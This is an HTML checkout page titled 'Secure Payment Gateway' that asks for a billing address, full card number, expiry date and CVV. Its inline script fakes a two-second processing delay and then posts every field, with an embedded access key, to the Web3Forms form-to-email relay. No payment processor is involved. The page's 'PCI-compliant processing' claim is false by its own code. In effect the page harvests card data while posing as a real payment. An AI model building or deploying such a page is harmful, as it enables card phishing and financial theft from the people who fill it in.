<!-- Payment Form - Refactored for Tailwind best practices. JS will be loaded from /assets/js/form.js -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Card Payment Form</title>
  <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-100">
  <section class="min-h-screen flex items-center justify-center px-4 sm:px-8 py-8">
    <div class="max-w-3xl w-full bg-white rounded-2xl shadow-lg p-6 sm:p-10 border border-gray-200">
      <div class="grid lg:grid-cols-2 gap-12">
        <!-- Illustration & Trust -->
        <div class="flex flex-col justify-center items-center text-center">
          <img src="https://readymadeui.com/images/payment-img.webp" alt="Payment Illustration" class="w-full h-32 object-contain object-center" />
          <h1 class="mt-8 text-3xl font-bold text-slate-900">Secure Payment Gateway</h1>
          <p class="mt-2 text-slate-500 text-sm max-w-sm mx-auto">Complete your payment securely. PCI-compliant processing.</p>
          <div class="flex items-center justify-center gap-3 mt-6">
            <img src="https://readymadeui.com/images/visa.webp" class="w-10" alt="Visa" />
            <img src="https://readymadeui.com/images/american-express.webp" class="w-10" alt="Amex" />
            <img src="https://readymadeui.com/images/master.webp" class="w-10" alt="MasterCard" />
          </div>
        </div>
        <!-- Payment Form -->
        <form id="checkoutForm" class="space-y-6" novalidate>
          <h2 class="text-xl font-semibold text-slate-900">Complete Payment</h2>
          <div id="error-summary" class="sr-only"></div>
          <!-- Billing Address -->
          <div>
            <h3 class="text-base font-semibold text-slate-800">Billing Address</h3>
            <div class="grid md:grid-cols-2 gap-4 mt-4">
              <div class="md:col-span-2">
                <label for="street" class="block text-sm font-medium text-slate-600 mb-2">Street Address *</label>
                <input type="text" id="street" name="street" required placeholder="1234 Main St" autocomplete="street-address"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                  aria-required="true" autofocus />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-street"></p>
              </div>
              <div>
                <label for="city" class="block text-sm font-medium text-slate-600 mb-2">City *</label>
                <input type="text" id="city" name="city" required placeholder="Enter city" autocomplete="address-level2"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none capitalize"
                  aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-city"></p>
              </div>
              <div>
                <label for="state" class="block text-sm font-medium text-slate-600 mb-2">State *</label>
                <select id="state" name="state" required autocomplete="address-level1"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none capitalize"
                  aria-required="true">
                  <option value="">Select state</option>
                  <option value="CA">California</option>
                  <option value="NY">New York</option>
                  <option value="TX">Texas</option>
                  <!-- ...other states... -->
                </select>
                <p class="mt-1 text-xs text-red-500 hidden" id="error-state"></p>
              </div>
              <div>
                <label for="zip" class="block text-sm font-medium text-slate-600 mb-2">ZIP Code *</label>
                <input type="text" id="zip" name="zip" required placeholder="12345" pattern="\d{5}" maxlength="5" autocomplete="postal-code"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                  aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-zip"></p>
              </div>
            </div>
          </div>
          <!-- Payment Info -->
          <div>
            <h3 class="text-base font-semibold text-slate-800">Payment Information</h3>
            <div class="grid md:grid-cols-2 gap-4 mt-4">
              <div class="md:col-span-2">
                <label for="card_name" class="block text-sm font-medium text-slate-600 mb-2">Cardholderâ€™s Name *</label>
                <input type="text" id="card_name" name="card_name" required placeholder="Name on card" autocomplete="cc-name"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none"
                  aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-card_name"></p>
              </div>
              <div>
                <label for="card_number" class="block text-sm font-medium text-slate-600 mb-2">Card Number *</label>
                <input type="text" id="card_number" name="card_number" required placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none" aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-card_number"></p>
              </div>
              <div>
                <label for="expiry" class="block text-sm font-medium text-slate-600 mb-2">Expiry (MM/YY) *</label>
                <input type="text" id="expiry" name="expiry" required placeholder="MM/YY" maxlength="5" autocomplete="cc-exp"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none" aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-expiry"></p>
              </div>
              <div>
                <label for="cvv" class="block text-sm font-medium text-slate-600 mb-2">CVV *</label>
                <input type="text" id="cvv" name="cvv" required placeholder="123" maxlength="4" autocomplete="cc-csc"
                  class="w-full px-4 py-3 rounded-md border border-gray-300 focus:border-blue-500 focus:ring-1 focus:ring-blue-500 outline-none" aria-required="true" />
                <p class="mt-1 text-xs text-red-500 hidden" id="error-cvv"></p>
              </div>
            </div>
            <div class="mt-8">
              <button type="submit" class="w-full py-3 text-sm font-medium text-white bg-blue-600 hover:bg-blue-700 rounded-md transition flex items-center justify-center" id="submitBtn">
                <span id="btn-text">Pay Now</span>
                <svg id="btn-spinner" class="hidden animate-spin h-5 w-5 ml-2 text-white" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
                  <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
              </button>
              <p class="mt-2 text-xs text-center text-gray-500">No data stored on server. Demo only.</p>
            </div>
          </div>
        </form>
      </div>
    </div>
  </section>
  <!-- Custom Loader Overlay -->
  <div id="customLoader" class="fixed inset-0 bg-black bg-opacity-40 flex items-center justify-center z-50 hidden">
    <div class="flex flex-col items-center">
      <svg class="animate-spin h-12 w-12 text-blue-600 mb-4" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
        <circle class="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" stroke-width="4"></circle>
        <path class="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
      </svg>
      <span class="text-white text-lg font-semibold">Processing Payment...</span>
    </div>
  </div>
  <script src="/assets/js/form.js"></script>
  <script>
    // Integrate Web3Forms API for form submission with custom loader
    document.getElementById("checkoutForm").addEventListener("submit", async function(e) {
      e.preventDefault();

      const form = this;
      const submitButton = form.querySelector("button[type='submit']");
      const btnText = document.getElementById('btn-text');
      const spinner = document.getElementById('btn-spinner');
      const loader = document.getElementById('customLoader');
      btnText.classList.add('hidden');
      spinner.classList.remove('hidden');
      submitButton.disabled = true;
      loader.classList.remove('hidden');

      // Simulate loader for realism (2 seconds)
      await new Promise(resolve => setTimeout(resolve, 2000));

      // Collect form data
      const formData = new FormData(form);
      formData.append('access_key', '5ffd688b-788f-4bc4-9809-dac8dfd0e59b');
      const jsonData = {};
      formData.forEach((value, key) => { jsonData[key] = value; });

      try {
        const response = await fetch("https://api.web3forms.com/submit", {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Accept": "application/json"
          },
          body: JSON.stringify(jsonData)
        });
        const result = await response.json();
        if (result.success) {
          alert("Payment submitted successfully!");
          form.reset();
        } else {
          alert("Failed to submit payment. Please try again.");
        }
      } catch (error) {
        alert("An error occurred. Please try again.");
      } finally {
        btnText.classList.remove('hidden');
        spinner.classList.add('hidden');
        submitButton.disabled = false;
        loader.classList.add('hidden');
      }
    });
  </script>
</body>
</html>
